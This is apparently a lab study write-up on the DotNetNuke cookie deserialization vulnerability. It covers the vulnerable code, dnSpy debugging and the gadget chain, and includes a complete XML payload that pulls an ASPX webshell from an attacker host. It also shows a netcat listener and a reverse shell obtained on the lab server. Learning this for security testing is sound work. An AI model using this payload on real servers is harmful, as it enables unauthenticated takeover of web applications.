# DotNetNuke Cookie Deserialization RCE
This module analyzes and exploits a deserialization remote code execution vulnerability in the DotNetNuke (DNN) platform via malicious cookies, focusing on the .NET deserialization process, particularly the `XMLSerializer` class.
## Introduction
Serialization is the process of converting structured data into a format that can be stored in a file or database, or transmitted over a network. Typically, serialization involves a producer and a consumer of the serialized data structure or object.
We will focus on the `XMLSerializer` class, as it is directly related to the vulnerability covered in this module. As the name suggests, the `XMLSerializer` class stores the state of an object in XML format.

**[Limitations:](https://learn.microsoft.com/en-us/dotnet/standard/serialization/introducing-xml-serialization#items-that-can-be-serialized)**
- `XmlSerializer` class can only serialize public fields and property values of an object.
- `XmlSerializer` class supports a narrow set of object types, primarily due to the fact that it cannot serialize abstract classes:
  - `XmlElement` objects.
  - `XmlNode` objects.
  - `DataSet` objects.
- the type of the object being serialized must always be known to the `XmlSerializer` instance at runtime.
## Vulnerability Analysis
### Vulnerability Overview
The vulnerability lies in the handling of the `DNNPersonalization` cookie, which is associated with user profiles. Notably, it can be exploited without requiring authentication. The entry point for the vulnerability is the `LoadProfile` function within the `DotNetNuke.dll` module.

The `LoadProfile` function in the `DotNetNuke.Services.Personalization.PersonalizationController` namespace is triggered when a user visits a non-existent page in a DNN web application. It checks for the `DNNPersonalization` cookie and, if present, passes its value to the `DeserializeHashTableXml` function. 

```c#
		HttpContext httpContext = HttpContext.Current;
		if (httpContext != null && httpContext.Request.Cookies["DNNPersonalization"] != null)
		{
			text = httpContext.Request.Cookies["DNNPersonalization"].Value;
		}
	}
	personalizationInfo.Profile = (string.IsNullOrEmpty(text) ? new Hashtable() : Globals.DeserializeHashTableXml(text));
	return personalizationInfo;
}
```

This function then calls `DeSerializeHashtable`, using the hardcoded string `"profile"` as a second parameter.

```c#
    public static Hashtable DeserializeHashTableXml(string Source)
		{
			return XmlUtils.DeSerializeHashtable(Source, "profile");
		}
```

Inside `DeSerializeHashtable`, the process involves extracting the object type from the XML, creating an `XmlSerializer` based on it, and deserializing the user-controlled data. Critically, no type validation is performed during deserialization, making it a likely vector for exploitation.

```c#
    public static Hashtable DeSerializeHashtable(string xmlSource, string rootname)
		{
			Hashtable hashtable = new Hashtable();
			if (!string.IsNullOrEmpty(xmlSource))
			{
				try
				{
					XmlDocument xmlDocument = new XmlDocument();
					xmlDocument.LoadXml(xmlSource);
					foreach (object obj in xmlDocument.SelectNodes(rootname + "/item"))
					{
						XmlElement xmlElement = (XmlElement)obj;
						string attribute = xmlElement.GetAttribute("key");
						string attribute2 = xmlElement.GetAttribute("type");
						XmlSerializer xmlSerializer = new XmlSerializer(Type.GetType(attribute2));
						XmlTextReader xmlReader = new XmlTextReader(new StringReader(xmlElement.InnerXml));
						hashtable.Add(attribute, xmlSerializer.Deserialize(xmlReader));
					}
				}
				catch (Exception)
				{
				}
			}
			return hashtable;
		}
```

**Refrences:** https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf

### Manipulation of Assembly Attributes for Debugging
Debugging .NET web applications is often complicated by runtime optimizations that prevent setting breakpoints or inspecting local variables. This is because most assemblies are compiled in Release mode, with attributes like:

```
[assembly: Debuggable(DebuggableAttribute.DebuggingModes.IgnoreSymbolStoreSequencePoints)]
```
To improve the debugging experience, this can be changed to:

```
[assembly: Debuggable(DebuggableAttribute.DebuggingModes.Default | DebuggableAttribute.DebuggingModes.DisableOptimizations | DebuggableAttribute.DebuggingModes.IgnoreSymbolStoreSequencePoints | DebuggableAttribute.DebuggingModes.EnableEditAndContinue)]
```
Via right clicking the module name and then choosing `Edit Assembly Attributes (C#)` and click `Compile`

This modification can be done using dnSpy. It's crucial to edit the correct assembly — in this case, `DotNetNuke.dll` located at:

```
C:\inetpub\wwwroot\dotnetnuke\bin\DotNetNuke.dll
```
However, IIS loads assemblies from a temporary location:

```
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Temporary ASP.NET Files\dotnetnuke\
```
It's important to note that once the IIS worker process starts, it does not load assemblies directly from the DotNetNuke directory under the inetpub path. Instead, it copies the necessary modules to a temporary directory and loads them from there. To ensure IIS loads the edited module, simply restart the IIS service.
```
C:\Inetpub\wwwroot\dotnetnuke\bin> iisreset /noforce
```
### Debugging DotNetNuke Using dnSpy

To debug DNN properly, you need to attach your debugger (e.g., dnSpy) to the `w3wp.exe` process — the IIS worker process running the DNN instance. If `w3wp.exe` isn’t visible, simply visit the DNN site in a browser to trigger IIS to start it, then click `Refresh` in the `Attach` dialog.

After attaching, pause execution `Debug > BreakAll` and open `Debug > Windows > Modules` to view all loaded modules. Right-click any module and select `Open All Modules` to load them into the `Assembly Explorer`, once loaded, you can resume the proccess execution by clicking `Continue`.

From there, navigate to the `LoadProfile(int, int)` function in the `DotNetNuke.Services.Personalization.PersonalizationController` namespace within `DotNetNuke.dll`.
## Exploitation
### Payload Options

Since we're dealing with a deserialization vulnerability similar to the earlier examples, our current objective is to identify a suitable payload object for our exploit. This object must meet the following criteria:

1. It must execute code useful for our purposes.
2. It must exist within one of the assemblies already loaded by the DNN application.
3. It must be serializable using the `XmlSerializer` class.
4. It must conform to the XML structure expected by the vulnerable `DeSerializeHashtable` function.

#### FileSystemUtils PullFile Method
The `DotNetNuke.dll` assembly contains a `FileSystemUtils` class with a `PullFile` method, which can download files from a URL to the server — potentially useful for uploading a malicious ASPX shell. 

```c#
		public static string PullFile(string URL, string FilePath)
		{
			string result = "";
			try
			{
				WebClient webClient = new WebClient();
				webClient.DownloadFile(URL, FilePath);
			}
			catch (Exception ex)
			{
				FileSystemUtils.Logger.Error(ex);
				result = ex.Message;
			}
			return result;
		}
```

However, since `XmlSerializer` can only serialize public properties and fields (not methods), and `FileSystemUtils` exposes none that would invoke `PullFile`, it's not a viable payload object. As a result, an alternative approach is needed.

#### ObjectDataProvider Class
Muñoz and Mirosh revealed four .NET deserialization gadgets useful for exploitation, with the `ObjectDataProvider` class being the most versatile and used in their DNN exploit. According to official documentation, `ObjectDataProvider` wraps another object to act as a *binding source*—essentially an object providing data to UI elements.

Its power lies in allowing attackers to set the `MethodName` property to invoke any method on the wrapped object, while `MethodParameters` lets them pass arguments to that method. Importantly, since `MethodName` and `MethodParameters` are properties (not methods), `ObjectDataProvider` works within the serialization constraints of `XmlSerializer`. This makes it an ideal payload candidate for triggering arbitrary method calls during deserialization.

- Example Use of the `ObjectDataProvider` Instance:
  ```c#
  using System;
  using System.IO;
  using System.Xml.Serialization;
  using DotNetNuke.Common.Utilities;
  using System.Windows.Data;
  
  namespace ODPSerializer
  {
      class Program
      {
          static void Main(string[] args)
          {
              ObjectDataProvider myODP = new ObjectDataProvider();
              myODP.ObjectInstance = new FileSystemUtils();
              myODP.MethodName = "PullFile";
              myODP.MethodParameters.Add("http://192.168.45.192/myODPTest.txt");
              myODP.MethodParameters.Add("C:/inetpub/wwwroot/dotnetnuke/PullFileTest.txt");
              Console.WriteLine("Done!");
          }
      }
  }

  ```

**ObjectDataProvider Class Documentation:** https://learn.microsoft.com/en-us/dotnet/api/system.windows.data.objectdataprovider?view=windowsdesktop-9.0

#### Serialization of the ObjectDataProvider
As mentioned earlier, our `DNNPersonalization` cookie payload must be in XML format. Since we’ve already shown how to serialize an object using the `XmlSerializer` class, we can incorporate that code into our example application. However, the cookie needs a specific structure to reach the deserialization function—it must include a `"profile"` node with an `"item"` tag containing a `"type"` attribute that describes the enclosed object. Instead of manually building this XML, we can reuse the existing DNN function that generates the cookie value: `SerializeDictionary`, found in the `DotNetNuke.Common.Utilities.XmlUtils` namespace.
```c#
// DotNetNuke.Common.Utilities.XmlUtils
// Token: 0x06004365 RID: 17253 RVA: 0x000F2A74 File Offset: 0x000F0C74
public static string SerializeDictionary(IDictionary source, string rootName)
{
	string result;
	if (source.Count != 0)
	{
		XmlDocument xmlDocument = new XmlDocument();
		XmlElement xmlElement = xmlDocument.CreateElement(rootName);
		xmlDocument.AppendChild(xmlElement);
		foreach (object obj in source.Keys)
		{
			XmlElement xmlElement2 = xmlDocument.CreateElement("item");
			xmlElement2.SetAttribute("key", Convert.ToString(obj));
			xmlElement2.SetAttribute("type", source[obj].GetType().AssemblyQualifiedName);
			XmlDocument xmlDocument2 = new XmlDocument();
			XmlSerializer xmlSerializer = new XmlSerializer(source[obj].GetType());
			StringWriter stringWriter = new StringWriter();
			xmlSerializer.Serialize(stringWriter, source[obj]);
			xmlDocument2.LoadXml(stringWriter.ToString());
			xmlElement2.AppendChild(xmlDocument.ImportNode(xmlDocument2.DocumentElement, true));
			xmlElement.AppendChild(xmlElement2);
		}
		result = xmlDocument.OuterXml;
	}
	else
	{
		result = "";
	}
	return result;
}

```
With that in mind, we will adjust our application source code to look like the following:
```c#
using System;
using System.IO;
using System.Xml.Serialization;
using DotNetNuke.Common.Utilities;
using System.Windows.Data;
using System.Collections;

namespace ODPSerializer
{
    class Program
    {
        static void Main(string[] args)
        {
            ObjectDataProvider myODP = new ObjectDataProvider();
            myODP.ObjectInstance = new FileSystemUtils();
            myODP.MethodName = "PullFile";
            myODP.MethodParameters.Add("http://192.168.45.192/myODPTest.txt");
            myODP.MethodParameters.Add("C:/inetpub/wwwroot/dotnetnuke/PullFileTest.txt");

            Hashtable table = new Hashtable();
            table["myTableEntry"] = myODP;
            String payload = "; DNNPersonalization=" + XmlUtils.SerializeDictionary(table, "profile");
            TextWriter writer = new StreamWriter("C:\\Users\\Public\\PullFileTest.txt");
            writer.Write(payload);
            writer.Close();

            Console.WriteLine("Done!");
        }
    }
}

```
If we compile the new proof of concept and run it under the dnSpy debugger we will be greeted with the following message:
```
An unhandled exception occurred in ODPSerializer.exe (9420)
Exception: System.InvalidOperationException
Message: There was an error generating the XML document.
```
If we drill down to the `_innerException` > `_message` value of the exception variable, we can see that the serializer did not expect the `FileSystemUtils` class instance
```
The type DotNetNuke.Common.Utilities.FileSystemUtils was not expected. Use the XmlInclude or SoapInclude attribute to specify types that are not known statically.
```
The issue arises because the `XmlSerializer` in the `SerializeDictionary` function is instantiated using the type returned by the object’s `GetType` method. 

```c#
XmlSerializer xmlSerializer = new XmlSerializer(myODP.GetType(), new Type[] {typeof(FileSystemUtils)});
```

Since we pass an `ObjectDataProvider` instance, the serializer expects that type and is unaware of the wrapped `FileSystemUtils` object inside it, causing serialization to fail.

While it’s theoretically possible to fix this by using a different `XmlSerializer` constructor that specifies the wrapped object’s type, this wouldn’t help because the vulnerable DNN function still uses the default constructor during deserialization. As a result, the error persists.

In short, we cannot successfully serialize our payload using the DNN `SerializeDictionary` function, so we need to explore a different object to achieve invoking the `PullFile` method.

#### ExpandedWrapper Class
To address the serialization issue, Muñoz and Mirosh proposed using the `ExpandedWrapper` class to finalize the construction of a malicious payload. This class allows us to wrap the original `ObjectDataProvider` and expose its relevant properties—such as `MethodName` and `MethodParameters`—as properties of the `ExpandedWrapper` instance. This approach works because `XmlSerializer` can only serialize public properties and fields, not methods. **By using `ExpandedWrapper`, we meet that requirement and enable successful serialization of the payload.**

Let's see how that looks in practice: https://github.com/m0hammad-yaser/OSWE-AWAE-Notes/blob/main/DotNetNuke/ExpWrap/ExpWrapSerializer.cs

beginning at line `18`, we see that instead of using the `ObjectDataProvider` directly, an instance of `ExpandedWrapper<FileSystemUtils, ObjectDataProvider>` is created. The `ProjectedProperty0` property is then used to assign a new `ObjectDataProvider` instance. The rest of the code remains largely unchanged.

When this code is compiled and executed, it runs without errors, and the web server successfully processes the corresponding HTTP request—**confirming that the payload was correctly serialized and executed**.

The serialized object now looks like this:
```xml
<profile><item key="myTableEntry" type="System.Data.Services.Internal.ExpandedWrapper`2[[DotNetNuke.Common.Utilities.FileSystemUtils, DotNetNuke, Version=9.1.0.367, Culture=neutral, PublicKeyToken=null],[System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]], System.Data.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"><ExpandedWrapperOfFileSystemUtilsObjectDataProvider xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><ProjectedProperty0><ObjectInstance xsi:type="FileSystemUtils" /><MethodName>PullFile</MethodName><MethodParameters><anyType xsi:type="xsd:string">http://192.168.45.192/cmdasp.aspx</anyType><anyType xsi:type="xsd:string">C:/inetpub/wwwroot/dotnetnuke/cmdasp.aspx</anyType></MethodParameters></ProjectedProperty0></ExpandedWrapperOfFileSystemUtilsObjectDataProvider></item></profile>
```
### RCE
At this stage, we can set up the full attack and attempt to gain a reverse shell by exploiting the vulnerability. To do this, we'll use an ASPX command shell available on our Kali attack machine. We'll copy the shell to the web server’s root directory.
```bash
┌──(kali㉿kali)-[~]
└─$ cd /usr/share/webshells/aspx/
                                                                                                             
┌──(kali㉿kali)-[/usr/share/webshells/aspx]
└─$ python3 -m http.server 80          
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...


```
Starting our NetCat listener on the spicefied port:
```bash
                                                                                                                                        
┌──(kali㉿kali)-[~]
└─$ nc -nlvp 1337
listening on [any] 1337 ...


```
And run this script: https://github.com/m0hammad-yaser/OSWE-AWAE-Notes/blob/main/DotNetNuke/rce_script.py , containing the malicious serialized object.

```bash
┌──(kali㉿kali)-[~]
└─$ python3 test.py 192.168.45.208 1337
[*] {'DNNPersonalization': '<profile><item key="myTableEntry" type="System.Data.Services.Internal.ExpandedWrapper`2[[DotNetNuke.Common.Utilities.FileSystemUtils, DotNetNuke, Version=9.1.0.367, Culture=neutral, PublicKeyToken=null],[System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]], System.Data.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"><ExpandedWrapperOfFileSystemUtilsObjectDataProvider xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><ProjectedProperty0><ObjectInstance xsi:type="FileSystemUtils" /><MethodName>PullFile</MethodName><MethodParameters><anyType xsi:type="xsd:string">http://192.168.45.208/cmdasp.aspx</anyType><anyType xsi:type="xsd:string">C:/inetpub/wwwroot/dotnetnuke/cmdasp.aspx</anyType></MethodParameters></ProjectedProperty0></ExpandedWrapperOfFileSystemUtilsObjectDataProvider></item></profile>'}
[*] Uploading the webshell to the traget machine...
[+] Webshell uploaded succssfully
[+] Access your webshell http://dnn/dotnetnuke/cmdasp.aspx
[*] Triggering reverse shell. Check your listener


```

We will receive a reverse connection
```bash
┌──(kali㉿kali)-[~]
└─$ nc -nlvp 1337
listening on [any] 1337 ...
connect to [192.168.45.208] from (UNKNOWN) [192.168.156.120] 49174
whoami
iis apppool\defaultapppool
PS C:\windows\system32\inetsrv>
```
